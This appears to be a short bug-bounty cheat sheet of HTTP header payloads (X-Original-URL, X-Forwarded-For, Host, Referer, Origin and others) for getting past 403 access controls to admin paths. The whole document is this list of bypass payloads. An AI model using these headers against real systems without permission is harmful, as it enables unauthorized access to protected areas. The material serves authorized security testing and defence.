# Header Manipulation Reference

## URL Rewrite Headers

### Payload 1

```http
X-Original-URL: /admin
```

---

### Payload 2

```http
X-Rewrite-URL: /admin
```

---

## IP-Based Bypass

### Payload 1

```http
X-Forwarded-For: 127.0.0.1
```

---

### Payload 2

```http
X-Forwarded-For: localhost
```

---

### Payload 3

```http
X-Real-IP: 127.0.0.1
```

---

## Host Manipulation

### Payload 1

```http
X-Forwarded-Host: localhost
```

---

### Payload 2

```http
Host: localhost
```

---

## Referer Manipulation

### Payload

```http
Referer: /admin
```

---

## Origin Manipulation

### Payload

```http
Origin: https://target.com
```

---

## Bug Bounty Reminder

Whenever you see:

```text
403 Forbidden
```

try:

```http
X-Original-URL
X-Rewrite-URL
X-Forwarded-For
Referer
```